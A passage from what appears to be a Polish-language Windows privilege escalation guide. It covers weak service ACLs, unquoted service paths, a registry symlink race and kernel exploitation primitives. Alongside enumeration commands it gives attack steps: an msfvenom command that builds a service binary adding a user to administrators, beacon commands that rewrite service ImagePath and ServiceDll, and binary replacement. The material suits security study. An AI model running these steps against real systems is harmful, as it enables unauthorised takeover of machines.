Jeśli usługa działa jako **`LocalSystem`**, **`LocalService`**, **`NetworkService`** lub uprzywilejowane konto domenowe, ale **użytkownicy o niskich uprawnieniach mogą modyfikować plik EXE usługi lub jego folder nadrzędny**, często można przejąć kontrolę nad usługą, **zastępując plik binarny i ponownie uruchamiając usługę**.

**Sprawdź, czy możesz modyfikować plik binarny uruchamiany przez usługę** albo czy masz **uprawnienia do zapisu w folderze**, w którym znajduje się ten plik ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Za pomocą **wmic** (poza system32) możesz pobrać listę wszystkich plików binarnych uruchamianych przez usługi, a następnie sprawdzić swoje uprawnienia za pomocą **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Możesz również użyć **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Szukaj niebezpiecznych ACL przyznanych **`Everyone`**, **`BUILTIN\Users`** lub **`Authenticated Users`**, zwłaszcza **`(F)`**, **`(M)`** lub **`(W)`** dla pliku wykonywalnego usługi albo katalogu, w którym się znajduje. Praktyczny schemat nadużycia:<sup>[[27]](#references)</sup>

1. Sprawdź konto usługi i ścieżkę do pliku wykonywalnego za pomocą `sc qc <service_name>`.
2. Sprawdź, czy plik binarny jest zapisywalny, za pomocą `icacls <path>`.
3. Zastąp plik binarny usługi payloadem lub prawidłowym, złośliwym plikiem binarnym usługi.
4. Uruchom ponownie usługę za pomocą `sc stop <service_name> && sc start <service_name>` (lub poczekaj na ponowne uruchomienie systemu / wyzwolenie usługi).

Przydatne automatyczne kontrole:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Jeśli usługa nie pozwala zwykłemu użytkownikowi jej ponownie uruchomić, sprawdź, czy uruchamia się automatycznie podczas rozruchu, ma akcję po awarii, która ją ponownie uruchamia, lub może zostać wywołana pośrednio przez korzystającą z niej aplikację.

### Uprawnienia do modyfikowania rejestru usług

Sprawdź, czy możesz modyfikować rejestr dowolnej usługi.\
Możesz **sprawdzić** swoje **uprawnienia** do **rejestru** usługi za pomocą:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Pierwotny test uprawnień został opisany następująco:

Należy sprawdzić, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia `FullControl`. Jeśli tak, można zmodyfikować plik binarny uruchamiany przez usługę.

Sprawdź, czy **Authenticated Users** lub **NT AUTHORITY\INTERACTIVE** mają uprawnienia rejestru umożliwiające zapis do klucza konkretnej usługi. Sam wpis ACL nie dowodzi, że dostęp jest faktycznie możliwy: znaczenie mają wpisy odmowy, bieżący token oraz uprawnienia dziedziczone. Uprawnienia do klucza rejestru różnią się od uprawnień `SERVICE_CHANGE_CONFIG` i `SERVICE_START` do obiektu usługi. Eskalacja wymaga również odpowiedniego pola konfiguracji usługi, sposobu jej uruchomienia oraz tożsamości usługi o wyższych uprawnieniach. Zobacz dokumentację Microsoft dotyczącą [uprawnień do kluczy rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) oraz [uprawnień dostępu do usług](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Aby zmienić ścieżkę pliku binarnego uruchamianego przez usługę:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Wyścig symlinków rejestru umożliwiający zapis dowolnej wartości HKLM (ATConfig)

Niektóre funkcje ułatwień dostępu systemu Windows tworzą klucze **ATConfig** dla poszczególnych użytkowników, które następnie są kopiowane przez proces **SYSTEM** do klucza sesji HKLM. **Wyścig symlinków** w rejestrze może przekierować ten uprzywilejowany zapis do **dowolnej ścieżki HKLM**, zapewniając możliwość **zapisu dowolnej wartości** HKLM.<sup>[[18]](#references)</sup>

Lokalizacje kluczy (przykład: Klawiatura ekranowa `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` zawiera listę zainstalowanych funkcji ułatwień dostępu.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` przechowuje konfigurację kontrolowaną przez użytkownika.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` jest tworzony podczas logowania lub przejść do bezpiecznego pulpitu i jest zapisywalny przez użytkownika.

Przebieg ataku (CVE-2026-24291 / ATConfig):

1. Ustaw wartość **HKCU ATConfig**, którą SYSTEM ma zapisać.
2. Wywołaj kopiowanie na bezpiecznym pulpicie (np. **LockWorkstation**), które uruchamia przepływ AT broker.
3. **Wygraj wyścig**, zakładając **oplock** na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; gdy oplock zadziała, zastąp klucz **HKLM Session ATConfig** **linkiem rejestru** do chronionego celu HKLM.
4. SYSTEM zapisze wybraną przez atakującego wartość w przekierowanej ścieżce HKLM.

Mając możliwość zapisu dowolnej wartości HKLM, przejdź do LPE, nadpisując wartości konfiguracji usług:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (plik EXE / wiersz poleceń)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (plik DLL)

Wybierz usługę, którą może uruchomić zwykły użytkownik (np. **`msiserver`**) i uruchom ją po zapisie. **Uwaga:** publiczna implementacja exploita **blokuje stację roboczą** w ramach wyścigu.

Przykładowe narzędzia (RegPwn BOF / standalone):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Uprawnienia AppendData/AddSubdirectory do rejestru usług

Jeśli masz to uprawnienie do rejestru, oznacza to, że **możesz tworzyć podrejestry w jego obrębie**. W przypadku usług Windows **wystarczy to do wykonania dowolnego kodu:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Niecytowane ścieżki usług

Jeśli ścieżka do pliku wykonywalnego nie jest ujęta w cudzysłowy, Windows spróbuje uruchomić każdy jej fragment kończący się przed spacją.

Na przykład dla ścieżki _C:\Program Files\Some Folder\Service.exe_ Windows spróbuje uruchomić:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Wyświetl wszystkie nieujęte w cudzysłowy ścieżki usług, z wyłączeniem tych należących do wbudowanych usług systemu Windows:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Możesz wykryć i wykorzystać** tę podatność za pomocą metasploit: `exploit/windows/local/trusted\_service\_path` Możesz ręcznie utworzyć plik binarny usługi za pomocą metasploit:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Działania naprawcze

Windows pozwala użytkownikom określić działania podejmowane w przypadku awarii usługi. Tę funkcję można skonfigurować tak, aby wskazywała plik binarny. Jeśli można go podmienić, eskalacja uprawnień może być możliwa. Więcej informacji można znaleźć w [oficjalnej dokumentacji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Skrypty wskazane w zadaniach harmonogramu

W przypadku włączonego zadania, które uruchamia `cmd.exe /c` z plikiem `.bat` lub `.cmd`, sprawdź skrypt wskazany w **argumentach akcji**, a także `cmd.exe`. To samo dotyczy jawnie wskazanego pliku dla interpretera, takiego jak PowerShell `-File`. Jeśli zaplanowany plik wsadowy zawiera dosłowne wywołanie PowerShell `-File`, sprawdź również ACL wskazanego skryptu; zmienne, instrukcje warunkowe i łączenie poleceń powłoki wymagają ręcznego prześledzenia. Skrypt lub katalog nadrzędny, do którego wywołujący może zapisywać, stanowi trop prowadzący do wykonania kodu w kontekście innego konta tylko wtedy, gdy skonfigurowany podmiot zabezpieczeń zadania różni się od konta wywołującego, a zadanie faktycznie wykonuje tę akcję. ACL zezwalający wyłącznie na dopisywanie danych może mieć znaczenie w przypadku skryptów, ale wcześniejsze `exit` lub inny przebieg sterowania mogą sprawić, że dopisane wiersze będą nieosiągalne. Zanim stwierdzisz, że możliwa jest eskalacja, potwierdź efektywne ACL, [kontekst wykonywania zadania](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), katalog roboczy, wyzwalacz i zasady kontroli aplikacji. Inwentaryzacja nie powinna modyfikować skryptu ani uruchamiać zadania.

## Strumienie nazwane w dostępnych plikach

W systemie NTFS plik, który można odczytać, może zawierać nazwany strumień `:$DATA`, którego zawartość nie jest widoczna w zwykłym wykazie katalogu. W przypadku niewielkiego, istotnego zbioru dostępnych kopii zapasowych lub plików konfiguracyjnych przed otwarciem jakiejkolwiek zawartości sprawdź **nazwy i rozmiary** strumieni; Windows udostępnia je przez [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) oraz PowerShell [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Nazwa strumienia sugerująca sekret to tylko trop. Sprawdź efektywne uprawnienia do odczytu pliku, obsługę strumieni przez system plików, czy strumień zawiera użyteczne dane uwierzytelniające oraz z jakim kontem się one uwierzytelniają. Podczas rutynowego wyliczania unikaj rekurencyjnego skanowania strumieni i wyświetlania ich zawartości.

## Pliki wejściowe pomocnika Windows Driver Kit uruchamianego przez harmonogram

Opcjonalny Windows Driver Kit zawiera `StandaloneRunner.exe`, który może odczytywać pliki `command.txt`, `reboot.rsf` oraz plik projektu `working\rsf.rsf` z katalogu uruchomieniowego. Zadanie harmonogramu lub usługa uruchamiająca ten pomocnik z uprzywilejowanym kontem może umożliwić wykonanie poleceń w kontekście tego konta dzięki uprawnieniom zapisu dla użytkownika o niskich uprawnieniach do tych plików wejściowych, nawet jeśli sam plik wykonywalny jest chroniony. Potwierdź, że uprzywilejowany proces z nich korzysta oraz że **oba** pliki towarzyszące można utworzyć lub zmodyfikować; samo znalezienie pomocnika nie wystarczy.

W przypadku zadania harmonogramu sprawdź jego akcję [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) oraz ACL obu ścieżek plików towarzyszących. Jeśli zadanie nie określa katalogu roboczego, katalog pliku wykonywalnego to tylko trop do zweryfikowania, a nie dowód na to, skąd zadanie odczytuje pliki wejściowe. Musi być również spełniony warunek dotyczący pliku roboczego projektu. Sprawdź rzeczywisty podmiot zabezpieczeń zadania, zamiast zakładać, że działa ono jako SYSTEM.

## Aplikacje

### Zainstalowane aplikacje

Sprawdź **uprawnienia do plików binarnych** (być może można nadpisać jeden z nich i eskalować uprawnienia) oraz **katalogów** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Ścieżka naprawy agenta Checkmk Windows

[CVE-2024-0670](https://checkmk.com/werk/16361) dotyczy starszych agentów Checkmk Windows, które zapisywały pliki poleceń w `C:\Windows\Temp`, a następnie — gdy zastąpienie pliku się nie powiodło — wykonywały istniejący wcześniej plik chroniony przed zapisem. Producent naprawił ten problem w wersjach 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Sprawdź pełny numer zainstalowanej poprawki oraz to, czy może zostać uruchomiona podatna operacja agenta; sama etykieta gałęzi, taka jak `2.1`, nie pozwala stwierdzić, czy system jest podatny. Podczas enumeracji można sprawdzić wersję, stan usługi i uprawnienia do Temp bez tworzenia plików ani uruchamiania poleceń agenta.

#### Weryfikacja usługi SAML ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) dotyczyło kompilacji ADSelfService Plus 6210 i wcześniejszych; producent naprawił problem w kompilacji 6211. Luka ma znaczenie tylko wtedy, gdy SAML SSO **jest lub było** włączone. Wpis dotyczący zainstalowanego produktu lub ścieżka usługi to zatem wskazówka, a nie potwierdzenie podatności: sprawdź dokładną kompilację, historię konfiguracji SAML, dostępność usługi z sieci oraz konto, na którym działa. Wykonanie kodu za pośrednictwem usługi odbywa się z uprawnieniami tego konta; uruchomienie jako SYSTEM wymaga instancji działającej jako SYSTEM. Możliwy do odczytania plik `OfflineBackup_*.ezip` w katalogu Backup produktu to osobna wskazówka dotycząca zaszyfrowanej kopii zapasowej, a nie dowód na istnienie użytecznych poświadczeń ani tej luki SAML. Podczas rutynowej enumeracji zapisz jego ścieżkę i uprawnienia dostępu, ale go nie rozpakowuj.

#### Granice uprawnień kontrolera Jenkins i kont domenowych

Na kontrolerze Jenkins w systemie Windows rozróżnij uprawnienie do utworzenia lub skonfigurowania zadania od uprawnienia do jego uruchomienia: [Jenkins opisuje je jako odrębne uprawnienia `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Skonfigurowany harmonogram lub zdalne wyzwalanie mogą zapewnić inną drogę uruchomienia kompilacji, ale potwierdź, że są włączone i kompilacja faktycznie się uruchamia. Kod jest wykonywany z tożsamością kontrolera lub wybranego agenta, a zapisane poświadczenie można wykorzystać tylko wtedy, gdy zadanie ma dostęp do jego zakresu. Osobno sprawdź dostęp do metadanych `JENKINS_HOME`: Jenkins przechowuje poświadczenia oraz klucze szyfrujące w plikach `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([przechowywanie sekretów Jenkins](https://www.jenkins.io/doc/developer/security/secrets/)). Sama ich obecność nie ujawnia hasła; sprawdź **uprawnienia odczytu wymaganych plików** oraz odrębną ścieżkę ponownego użycia konta, nie wyświetlając sekretów we wspólnych wynikach. Jeśli konto ma uprawnienie zapisu do atrybutu `scriptPath` obiektu użytkownika AD, potwierdź, że ścieżka skryptu jest zapisywalna oraz że istnieje rzeczywiste logowanie lub zaplanowany proces uruchamiany jako użytkownik docelowy, zanim uznasz to za wykonanie kodu jako inny użytkownik. Dalsze możliwości kontroli grup wymagają osobnej weryfikacji efektywnych uprawnień AD.

#### Tożsamość agenta samoobsługowego Azure Pipelines

W przypadku projektu Azure DevOps Server lub Azure Pipelines rozróżnij uprawnienie do **utworzenia lub edycji** pipeline'u od uprawnienia do jego **uruchomienia** i użycia wybranej puli agentów; [Microsoft opisuje uprawnienia pipeline'u](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autoryzację puli](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) oddzielnie. Jeśli konto o niższych uprawnieniach może przesłać krok skryptu i uruchomić pipeline na samoobsługowym agencie Windows, krok jest wykonywany jako [skonfigurowane dla agenta konto systemu operacyjnego](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Zanim stwierdzisz, że dochodzi do przejścia na konto innego użytkownika lub SYSTEM, sprawdź dokładny pipeline, ograniczenia gałęzi i zasobów, autoryzowaną pulę, zadanie możliwe do uruchomienia oraz tożsamość usługi agenta. Zainstalowany agent, rola w projekcie lub uprawnienia zapisu do repozytorium to tylko wskazówki; podczas pasywnej enumeracji sprawdź uprawnienia i lokalne metadane usługi, nie uruchamiając kompilacji.

#### Poświadczenia Microsoft Entra Connect Sync

[Microsoft rozróżnia](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **konto usługi ADSync**, które uruchamia usługę synchronizacji i uzyskuje dostęp do jej bazy danych SQL, od **konta łącznika AD DS**, którego uprawnienia w katalogu zależą od skonfigurowanych funkcji synchronizacji. Poświadczenia łącznika są przechowywane w tej bazie w postaci zaszyfrowanej, a materiał kluczowy jest [chroniony przez DPAPI w kontekście konta usługi ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Sama zainstalowana usługa synchronizacji, grupa, której nazwa sugeruje uprawnienia administratora lokalnego, lub dostęp do bazy danych nie potwierdzają, że poświadczenia można odszyfrować ani że możliwa jest eskalacja uprawnień w domenie. Osobno sprawdź rzeczywiste uprawnienia odczytu bazy danych, dostęp do konta usługi i klucza, układ instalacji i SQL, skonfigurowaną tożsamość łącznika oraz efektywne uprawnienia tej tożsamości w AD. Rutynowa enumeracja powinna wykazywać jedynie metadane usługi i dostępu, a nie odpytywać ani wyświetlać zapisanych sekretów.

#### Uprawnienia do bibliotek DLL obsługi sterownika drukarki

Zainstalowany sterownik drukarki może przechowywać biblioteki DLL obsługi w `C:\ProgramData` i ładować je w procesie drukowania o wyższych uprawnieniach. Sprawdź listy ACL dokładnego katalogu sterownika i bibliotek DLL, w tym katalogów nadrzędnych oraz punktów ponownej analizy, nawet jeśli enumeracja drukarek przez WMI jest zablokowana. W przypadku [problemu ze sterownikiem drukarki Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) zgłoszona ścieżka to `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [pierwotny opis](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) przedstawia ładowanie bibliotek DLL przez `PrintIsolationHost.exe`. Zapis w ACL to tylko wskazówka: zweryfikuj efektywne uprawnienia zapisu po uwzględnieniu wpisów odmowy, to, czy odpowiedni sterownik jest zainstalowany i ładuje plik z uprawnieniami uprzywilejowanej tożsamości, oraz czy producent naprawił instalację w zaktualizowanym sterowniku lub programie bezpieczeństwa. Nie wnioskuj o podatności wyłącznie na podstawie nazwy katalogu lub wersji sterownika.

### Uprawnienia do zapisu

Sprawdź, czy możesz zmodyfikować jakiś plik konfiguracyjny, aby odczytać określony plik, albo czy możesz zmodyfikować plik binarny, który zostanie uruchomiony przez konto Administratora (schedtasks).

Sposobem na znalezienie słabych uprawnień do folderów i plików w systemie jest:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Persistence/execution przez autoload pluginów Notepad++

Notepad++ automatycznie ładuje wszystkie biblioteki DLL pluginów z podfolderów `plugins`. Jeśli dostępna jest zapisywalna instalacja przenośna lub kopia programu, umieszczenie w niej złośliwego pluginu zapewnia automatyczne wykonanie kodu w procesie `notepad++.exe` przy każdym uruchomieniu (również z poziomu `DllMain` i callbacków pluginu).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Uruchamianie podczas startu

**Sprawdź, czy możesz nadpisać wpis rejestru lub plik binarny, który zostanie uruchomiony przez innego użytkownika.**\
**Przeczytaj** **poniższą stronę**, aby dowiedzieć się więcej o interesujących **lokalizacjach autoruns umożliwiających eskalację uprawnień**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sterowniki

Szukaj potencjalnie **dziwnych/podatnych** sterowników firm trzecich

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Jeśli driver udostępnia prymityw dowolnego odczytu/zapisu w kernelu (częsty problem w źle zaprojektowanych handlerach IOCTL), możesz eskalować uprawnienia, kradnąc token SYSTEM bezpośrednio z pamięci kernela.<sup>[[13]](#references)</sup> Instrukcję krok po kroku znajdziesz tutaj:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Powiązane materiały dotyczące eksploatacji kernela Windows:

Przykład ring-buffera w trybie kernela z rejestrami odczytu/zapisu, które można modyfikować z poziomu użytkownika, znajdziesz w [wariancie USB MIDI looped-streaming](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

W przypadku błędów race condition, w których podatne wywołanie otwiera ścieżkę Object Manager kontrolowaną przez atakującego, celowe spowolnienie wyszukiwania (przez użycie komponentów o maksymalnej długości lub głębokich łańcuchów katalogów) może wydłużyć okno z mikrosekund do kilkudziesięciu mikrosekund:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF-y w cancel-safe queue, ujawnienia danych z paged-pool i pivoty I/O ring

Niektóre łańcuchy LPE w kernelu Windows można zbudować z dwóch osobno mało groźnych błędów: **wyścigu cyklu życia cancel-safe queue**, który zwalnia żądanie/CBD, gdy blokada kolejki jest nadal zajęta, oraz ujawnienia danych spowodowanego przez **zwolnienie blokady przed kopiowaniem**, które wycieka zawartość zwolnionej alokacji paged-pool podczas `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Uwagi dotyczące audytu i eksploatacji:

- **Zwolnienie pod blokadą + późniejsze anulowanie**: szukaj ścieżki sukcesu w postaci **Acquire -> CompleteRequest/free -> Release**, podczas gdy ścieżka anulowania wykonuje **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Jeśli ścieżka sukcesu dochodzi do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` przed zwolnieniem blokady CBDQ/CSQ, wątek zablokowany w `NtCancelIoFileEx -> IopCsqCancelRoutine` może później wznowić działanie i przekazać zwolnione `PFLT_CALLBACK_DATA` do callbacku usuwającego sterownika.
- **Odzyskaj zwolniony obiekt kolejki** za pomocą alokacji paged-pool o tym samym rozmiarze, kontrolowanej przez atakującego. Wpisy Data Queue Entries z `NPFS` są przydatne, ponieważ można kontrolować ich zawartość i rozmiar, a później sprawdzać je operacjami odczytu/podglądu potoku. Jeśli zwolniony obiekt zawiera linki listy, nadpisz je **cykliczną listą fałszywych węzłów żądań w pamięci użytkownika**, aby sterownik wielokrotnie przetwarzał zdefiniowane przez atakującego struktury żądań zamiast zatrzymywać się na pierwotnym początku listy.
- **Rozszerz przewidywalny zapis**: jeśli fałszywe żądanie przekierowuje zagnieżdżony wskaźnik kontekstu używany przez zapisy księgowe (znaczniki czasu / QPC / pola sąsiadujące z refcount), możesz uzyskać zapis kernela, w którym kontrolujesz **adres, ale nie wartość**. W takim przypadku zaatakuj pole **length/size** obiektu z rozpylenia alokacji zamiast końcowego wskaźnika kodu/danych, a następnie przeszukaj rozpylenie, aż uszkodzony obiekt umożliwi odczyt poza zakresem z paged-pool.
- **Wzorzec podatnego na race condition ujawnienia danych**: każdy syscall, który wykonuje `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)`, jest dobrym kandydatem. Niezawodność rośnie, gdy atakujący może zwiększyć kopiowany bufor (na przykład przez dodanie wielu wpisów listy/zasobów, które zwiększają końcowy rozmiar alokacji serializatora), ponieważ dłuższe kopiowanie wydłuża okno na podmianę, niekoniecznie powodując awarię systemu.
- **Cele uzupełnienia zawierające wiele wskaźników**: zarejestrowane tablice buforów Windows **I/O ring** są doskonałymi celami ujawnienia danych, ponieważ ich rozmiar paged-pool można kontrolować z poziomu atakującego (`8 * regBufferCnt`), a każdy element jest wskaźnikiem kernela do `_IOP_MC_BUFFER_ENTRY`. Wyciek jednej z tych tablic pozwala odzyskać otaczający ją `IORING_OBJECT`, a następnie uszkodzić **`RegBuffers`** i **`RegBuffersCount`**, aby kolejne operacje I/O ring korzystały z podrobionych wpisów i umożliwiały dowolny odczyt/zapis kernela. Jeśli jedyny dostępny zapis daje stabilny bajt (na przykład z `KUSER_SHARED_DATA+0x14`), użyj **nakładających się, niewyrównanych zapisów**, aby zbudować wskaźnik użytkownika z powtarzającym się bajtem, taki jak `0x0101010101010101`, zmapuj go za pomocą `VirtualAlloc` i umieść tam podrobioną tablicę zarejestrowanych buforów.<sup>[[30]](#references)</sup>

Przydatne wskaźniki podczas debugowania:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Gdy uzyskasz dowolny odczyt/zapis w kernelu za pomocą uszkodzonego I/O ring, przejmij token SYSTEM, stosując standardowy workflow po uzyskaniu primitive:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitives korupcji pamięci hive rejestru

Współczesne luki w hive pozwalają przygotowywać deterministyczne układy pamięci, nadużywać zapisywalnych elementów potomnych HKLM/HKU i przekształcać korupcję metadanych w przepełnienia kernel paged pool bez niestandardowego drivera. Pełny łańcuch opisano tutaj:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues`: type confusion w trybie direct przy ścieżkach kontrolowanych przez atakującego

Niektóre drivery przyjmują ścieżkę rejestru z userlandu, sprawdzają jedynie, czy jest poprawnym ciągiem UTF-16, a następnie wywołują `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` z `RTL_QUERY_REGISTRY_DIRECT`, przekazując na stosie skalarną zmienną, taką jak `int readValue`. Jeśli brakuje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` jest interpretowane zgodnie z **rzeczywistym** typem rejestru, a nie typem oczekiwanym przez programistę.

Daje to dwa przydatne primitives:<sup>[[24]](#references)[[25]](#references)</sup>

- **Confused deputy / oracle**: kontrolowana przez użytkownika ścieżka absolutna `\Registry\...` pozwala driverowi odpytywać wybrane przez atakującego klucze, ujawniać ich istnienie za pomocą kodów zwrotnych/logów, a czasem odczytywać wartości, do których wywołujący nie miałby bezpośredniego dostępu.
- **Korupcja pamięci kernela**: docelowa zmienna skalarna, taka jak `&readValue`, staje się podatna na type confusion — może być traktowana jako `REG_QWORD`, `UNICODE_STRING` lub bufor binarny o określonym rozmiarze, zależnie od typu wartości rejestru.

Praktyczne uwagi dotyczące exploita:

- **Mitigacja w Windows 8+**: jeśli zapytanie dotyczy **niezaufanego hive** i używa `RTL_QUERY_REGISTRY_DIRECT` bez `RTL_QUERY_REGISTRY_TYPECHECK`, wywołania z kernela powodują crash `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Aby zachować możliwość exploita, szukaj **kluczy zapisywalnych przez atakującego w zaufanych hive systemu**, zamiast umieszczać wartości w `HKCU`.
- **Przygotowanie w zaufanym hive**: użyj NtObjectManager, aby wyliczyć zapisywalne elementy potomne `\Registry\Machine`, a następnie ponów skanowanie przy użyciu zduplikowanego tokena **o niskim poziomie integralności**, aby znaleźć klucze dostępne z kontekstów sandboxa:<sup>[[26]](#references)</sup>

```powershell
